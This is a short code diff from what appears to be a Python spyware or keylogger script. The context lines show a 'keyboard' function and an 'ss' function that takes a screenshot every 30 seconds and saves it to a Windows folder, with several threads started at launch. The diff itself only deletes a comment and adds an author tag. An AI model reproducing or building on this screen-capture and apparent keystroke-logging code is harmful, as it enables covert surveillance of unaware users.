@@ -53,7 +53,6 @@ def keyboard():
         
 def ss():
         threading.Timer(30.0, ss).start()
-        # Taking a screenshot using Pyautogui.
         screenshot = pyautogui.screenshot()
         file_name = str(time.time_ns()) + ".jpg"
         file_path = os.path.join('C:\\Picture\\Default', file_name)
@@ -106,4 +105,6 @@ if __name__ == '__main__':
     t2.start()
     t3.start()
     t4.start()
+    
+#onurkaya
 
